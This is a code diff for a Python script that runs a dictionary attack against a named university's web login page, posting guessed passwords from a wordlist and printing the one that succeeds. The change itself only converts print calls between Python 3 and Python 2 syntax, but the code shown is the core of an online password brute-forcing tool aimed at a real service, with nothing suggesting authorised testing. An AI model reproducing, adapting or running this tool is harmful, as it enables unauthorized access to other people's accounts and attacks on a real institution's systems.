@@ -12,14 +12,12 @@ from bs4 import BeautifulSoup as bs
 url='https://webkiosk.thapar.edu/CommonFiles/UserAction.jsp'
 
 def connect(url,m_data):
-	# print("requesting data:")
+	#print "requesting data:"
 	resp=requests.post(url,data=m_data)
-	# print("parsing data:")
 	soup=bs(resp.text,'html.parser')
 	x=soup.find_all('frame')
-	# print("checking data:")
 	if(len(x)!=0):
-		print("\nPassword is "+m_data["Password"])
+		print "\nPassword is "+m_data["Password"]
 		sys.exit()
 	resp = requests.post(url,data=m_data)
 #	got_d=soup.find('p').get_text()
@@ -38,8 +36,8 @@ def controller():
 			dict_file=[sys.argv[i]]+dict_file
 
 	count=1
-	print("beg: "+dict_file[0])
-	print("last: "+dict_file[len(dict_file)-1])
+	print "beg: "+dict_file[0]
+	print "last: "+dict_file[len(dict_file)-1]
 
 	for line in dict_file:
 		m["UserType"]="P"
